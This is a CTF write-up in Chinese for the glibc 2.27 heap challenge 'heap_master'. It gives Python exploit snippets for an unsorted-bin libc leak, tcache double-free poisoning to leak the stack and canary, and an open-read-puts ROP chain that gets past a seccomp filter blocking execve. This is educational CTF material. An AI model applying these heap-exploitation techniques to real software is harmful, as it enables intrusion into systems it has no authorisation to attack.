# MiniLCTF2020 - heap_master

## 题目简述

题目基于 glibc 2.27 tcache，并用 seccomp 禁止 `execve`，因此不能以 `system('/bin/sh')` 或 one-gadget 收尾。程序允许重复释放同一索引，可做 tcache double free。完整链需要依次泄露 libc、栈地址和 Canary，再把 open-read-puts ROP 写到栈上读取 flag。

## 解题过程

程序启动时把一段较长的名字读入栈，后续菜单提供 new、delete、show。glibc 2.27 尚没有较新的 tcache key 双重释放检测，可按以下阶段利用。

### 1. 泄露 libc

填满 `0x90` 对应的 tcache 后，再释放同尺寸块进入 unsorted bin，通过 show 读取 `main_arena` 指针：

```python
unsorted_arena = u64(io.recvline().rstrip().ljust(8, b'\0'))
libc_base = unsorted_arena - 0x3ebca0
environ = libc_base + 0x3ee098
```

这些偏移对应题目使用的 Ubuntu 18.04/glibc 2.27，不能跨版本照搬。

### 2. 把读指针改到 `environ`

对 `0x78` tcache bin 重复释放，污染 freelist 的 `fd`，让一次分配落到 BSS 中保存 size/指针的位置。覆盖第一个 note 指针为 `environ` 后调用 show，即可泄露栈地址：

```python
fake_bss = 0x602058 + 8
new(0x78, p64(fake_bss))
new(0x78, b'pad')
new(0x78, b'A' * 0x60 + p64(environ))
stack_leak = u64(show(0).ljust(8, b'\0'))
```

### 3. 泄露 Canary

最开始提交的名字中预先放置 `size=0x81` 的 fake chunk。再次污染 `0x78` tcache，使分配落到该栈区；写到 Canary 最低位之前，再用 show 读出剩余 7 字节并在低位补 `\x00`。

### 4. 栈上构造 ORP

最后污染 `0x300` tcache，使分配覆盖某个会返回的 new 调用栈帧。恢复 Canary 后写入 ROP：

```python
rop  = p64(pop_rdi) + p64(flag_addr)
rop += p64(pop_rsi) + p64(0) + p64(open_addr)
rop += p64(pop_rdi) + p64(3)
rop += p64(pop_rsi) + p64(flag_buf)
rop += p64(pop_rdx) + p64(0x30) + p64(read_addr)
rop += p64(pop_rdi) + p64(flag_buf) + p64(puts_addr)
rop += b'flag\x00'
```

触发该函数返回后执行 `open('flag',0) -> read(3,buf,0x30) -> puts(buf)`，绕过禁止 `execve` 的 seccomp。

官方仓库没有保留本题 ELF 与配套 libc；当前证据包含完整参赛脚本和精确利用阶段，但不能对旧地址做现代 libc 上的伪复现。

## 方法总结

复杂堆题应按“获得什么能力”分阶段记录：unsorted 泄露给 libc 基址，tcache poisoning 给任意分配，`environ` 给栈地址，栈 fake chunk 给 Canary，最后才是 ORP。seccomp 决定收尾方式，写 exploit 前必须先确认允许的系统调用。
